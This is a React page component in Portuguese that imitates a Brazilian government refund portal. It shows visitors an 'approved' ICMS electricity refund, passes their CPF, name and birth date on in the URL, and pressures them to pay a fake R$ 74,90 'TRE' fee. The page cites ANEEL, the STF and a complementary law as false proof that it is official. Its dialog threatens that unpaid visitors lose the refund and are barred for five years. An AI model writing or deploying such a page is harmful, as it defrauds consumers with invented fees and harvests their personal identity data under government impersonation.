import { useState, useEffect } from "react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Coins, User, Building, MapPin, ChevronRight, Calendar, Clock, CheckCircle, AlertCircle, X } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Dialog, DialogContent } from "@/components/ui/dialog";

export default function ConfirmacaoRestituicao() {
  // Estados para dados do resultado
  const [valorRestituicao, setValorRestituicao] = useState(0);
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [companhia, setCompanhia] = useState("");
  const [estado, setEstado] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");
  const [valorMedio, setValorMedio] = useState("");
  const [meses, setMeses] = useState("");
  const [dataPrevista, setDataPrevista] = useState("");
  const [dialogOpen, setDialogOpen] = useState(false);
  
  // Use useEffect para pegar os parâmetros da URL quando o componente montar
  useEffect(() => {
    // Recupera parâmetros da URL
    const searchParams = new URLSearchParams(window.location.search);
    
    // Preenche os estados com os parâmetros
    setCpf(searchParams.get('cpf') || '');
    setNome(searchParams.get('nome') || '');
    setCompanhia(searchParams.get('companhia') || '');
    setEstado(searchParams.get('estado') || '');
    setDataNascimento(searchParams.get('nasc') || '');
    setValorMedio(searchParams.get('valor') || '');
    setMeses(searchParams.get('meses') || '');
    setDataPrevista(searchParams.get('data_prevista') || calcularDataPrevisao());
    
    // Buscar valor da restituição
    const buscarRestituicao = async () => {
      try {
        // Limpar numeração do CPF
        const cpfLimpo = searchParams.get('cpf')?.replace(/\D/g, '') || '';
        
        // Consultar API
        const response = await fetch(`/api/restituicao?cpf=${cpfLimpo}`);
        const data = await response.json();
        
        if (data.encontrado && data.valorRestituicao) {
          // Usar o valor existente
          console.log("Valor encontrado no banco de dados:", data.valorRestituicao);
          const valorEmCentavos = Math.round(parseFloat(data.valorRestituicao) * 100);
          setValorRestituicao(valorEmCentavos);
        }
      } catch (error) {
        console.error("Erro ao buscar valor de restituição:", error);
      }
    };
    
    buscarRestituicao();
  }, []);

  // Função para calcular a data de previsão - exatamente 72 horas (3 dias) a partir da data/hora atual
  const calcularDataPrevisao = () => {
    const hoje = new Date();
    
    // Adicionar exatamente 72 horas (3 dias)
    const dataFutura = new Date(hoje.getTime() + (72 * 60 * 60 * 1000));
    
    const dia = dataFutura.getDate().toString().padStart(2, '0');
    const mes = (dataFutura.getMonth() + 1).toString().padStart(2, '0');
    const ano = dataFutura.getFullYear();
    
    return `${dia}/${mes}/${ano}`;
  };

  // Formatar CPF
  const formatarCPF = (cpf: string) => {
    if (!cpf) return "";
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  // Formatar valor monetário com separador de milhar
  const formatarMoeda = (valor: number) => {
    // Converter para valor formatado com separador de milhar e vírgula como decimal
    const valorEmReais = (valor / 100).toFixed(2);
    const partes = valorEmReais.split('.');
    
    // Adicionar separador de milhar
    partes[0] = partes[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    
    return `R$ ${partes.join(',')}`;
  };

  // Formatar data
  const formatarData = (data: string) => {
    // Verificar se a data é válida
    if (!data) return "";
    
    // Remover qualquer undefined da string
    const dataLimpa = data.replace(/undefined/g, "");
    
    // Se depois de limpar não sobrou nada útil
    if (!dataLimpa || dataLimpa.trim() === "/" || dataLimpa.trim() === "//") return "";
    
    try {
      // Tentar formatar se tiver o formato YYYY-MM-DD
      if (dataLimpa.includes("-") && dataLimpa.length >= 10) {
        const [ano, mes, dia] = dataLimpa.substring(0, 10).split('-');
        if (ano && mes && dia) {
          return `${dia}/${mes}/${ano}`;
        }
      }
      
      // Se não conseguir formatar, retornar a data limpa
      return dataLimpa;
    } catch {
      // Em caso de erro, retornar string vazia
      return "";
    }
  };

  const prosseguirParaPagamento = () => {
    // Criar URL com parâmetros
    const url = `/pagamento?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&valor=${encodeURIComponent(valorRestituicao)}&nasc=${encodeURIComponent(dataNascimento)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}`;
    
    // Usar history.pushState para transição mais rápida (sem recarregar a página inteira)
    window.history.pushState({}, "", url);
    
    // Redirecionar manualmente para garantir a navegação
    window.location.href = url;
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      <main className="flex-1 container max-w-5xl mx-auto px-4 py-8">
        <div className="grid grid-cols-1 md:grid-cols-[2fr_1fr] gap-6">
          <div className="space-y-6">
            <h1 className="text-2xl md:text-3xl font-bold text-[var(--gov-blue-dark)]">
              Resultado do Cálculo de Restituição
            </h1>
            
            <Card className="overflow-hidden">
              <div className="bg-gradient-to-b from-green-50 to-green-100 p-8 border-b border-green-200 rounded-t-md">
                <div className="flex items-center justify-center mb-3">
                  <div className="bg-green-100 p-3 rounded-full border border-green-200">
                    <CheckCircle className="text-green-600 h-8 w-8" />
                  </div>
                </div>

                <h3 className="font-bold text-green-800 text-2xl mb-2 text-center">
                  Restituição Disponível!
                </h3>
                
                <div className="h-0.5 w-32 bg-green-200 mx-auto my-4"></div>
                
                <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] text-center mb-6">
                  Valor Aprovado para Restituição
                </h2>
                
                <div className="bg-white p-6 rounded-md shadow-sm border border-green-200 mb-4 flex flex-col items-center">
                  <div className="flex items-center justify-center mb-2">
                    <Coins className="h-10 w-10 text-green-600 mr-3" />
                    <span className="text-4xl font-bold text-green-600">
                      {formatarMoeda(valorRestituicao)}
                    </span>
                  </div>
                  
                  {meses && (
                    <p className="text-sm text-[var(--gov-gray-dark)] mt-3 text-center">
                      Valor calculado com base em <span className="font-semibold">{meses} meses</span> de cobranças indevidas
                    </p>
                  )}
                </div>
              </div>
              
              <CardContent className="p-6 space-y-6">
                <div className="mb-8">
                  <h3 className="text-xl font-bold text-[#044785] mb-4">
                    <AlertCircle className="inline-block mr-2 h-5 w-5" />
                    Informações Importantes sobre a Restituição da ANEEL
                  </h3>
                  <div className="space-y-5">
                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">Por que estou pagando uma taxa se o valor é meu por direito?</h4>
                      <p className="text-gray-700 mb-2 pl-3">A TRE é uma exigência operacional imposta pelos órgãos públicos para garantir a segurança da liberação, evitando fraudes, duplicidades e erros de restituição.</p>
                    </div>
                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">A restituição é garantida após o pagamento da TRE?</h4>
                      <p className="text-gray-700 mb-2 pl-3">Sim. Após a confirmação, o valor de {formatarMoeda(valorRestituicao)} será depositado em até 72 horas úteis, conforme calendário de restituição oficial.</p>
                    </div>
                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">Como sei que isso é oficial?</h4>
                      <p className="text-gray-700 mb-2 pl-3">Todo o processo está amparado por decisão do STF, regulamentado pela Lei Complementar nº 194/2022, e validado pela ANEEL e Receita Federal.</p>
                    </div>
                  </div>
                  <div className="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 mt-6">
                    <p className="flex items-start">
                      <AlertCircle className="text-red-600 mr-2 mt-1 h-5 w-5 flex-shrink-0" />
                      <span><strong>ATENÇÃO:</strong> Sua solicitação ainda não foi confirmada devido à falta de pagamento da Taxa de Regularização Energética (TRE). Para garantir sua restituição é necessário efetuar o pagamento imediatamente.</span>
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
          
          <div className="space-y-6">
            <Card>
              <CardContent className="p-6 space-y-4">
                <h3 className="text-lg font-semibold text-[var(--gov-blue-dark)]">
                  Informações do Processo
                </h3>
                
                <div className="flex items-start space-x-3 border-b border-gray-100 pb-3">
                  <Clock className="h-5 w-5 text-[var(--gov-blue)] mt-0.5" />
                  <div>
                    <p className="text-sm text-[var(--gov-gray-dark)]">Previsão para Recebimento</p>
                    <p className="font-medium">{dataPrevista}</p>
                  </div>
                </div>
                
                <div className="flex items-start space-x-3 border-b border-gray-100 pb-3">
                  <AlertCircle className="h-5 w-5 text-amber-500 mt-0.5" />
                  <div>
                    <p className="text-sm text-[var(--gov-gray-dark)]">Status do Processo</p>
                    <p className="font-medium text-amber-600">Pendente</p>
                  </div>
                </div>
                
                <Button 
                  onClick={() => setDialogOpen(true)}
                  className="w-full bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 mt-4 text-white font-bold py-3"
                >
                  PAGAR TAXA E CONCLUIR
                  <ChevronRight className="ml-2 h-4 w-4" />
                </Button>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      
      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
        <DialogContent className="p-0 overflow-hidden max-w-[450px]">
          <div className="bg-white rounded-md p-6 w-full">
            <div className="mb-4 text-center">
              <div className="bg-red-100 p-3 rounded-full inline-flex items-center justify-center mb-3">
                <AlertCircle className="text-red-600 text-2xl" />
              </div>
              <h3 className="text-xl font-bold text-gray-900">AVISO IMPORTANTE</h3>
            </div>
            <div className="mb-5 text-gray-700">
              <p className="mb-3">Ao prosseguir, você autoriza a inclusão do seu CPF na lista de participantes do processo de restituição do ICMS e concorda com o pagamento obrigatório de <strong className="text-red-600">R$ 74,90</strong>.</p>
              <p className="mb-3"><strong>ATENÇÃO:</strong> Caso o pagamento não seja efetuado até a data de vencimento, você poderá deixar de receber <strong className="text-red-600">{formatarMoeda(valorRestituicao)}</strong> em restituições. Além disso, ficará impedido de solicitar o benefício neste ano e nos próximos 5 anos.</p>
              <div className="bg-yellow-50 p-3 border border-yellow-200 rounded-md">
                <p className="text-yellow-800"><strong>Importante:</strong> O pagamento é obrigatório para confirmar sua solicitação de restituição.</p>
              </div>
            </div>
            <div className="flex flex-col space-y-3">
              <Button 
                onClick={prosseguirParaPagamento}
                className="w-full px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-md transition-colors font-semibold"
              >
                Vou realizar o pagamento
              </Button>
              <Button 
                variant="outline"
                onClick={() => setDialogOpen(false)}
                className="w-full px-6 py-3 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 transition-colors font-medium"
              >
                Retornar ao processo
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
      
      <Footer />
    </div>
  );
}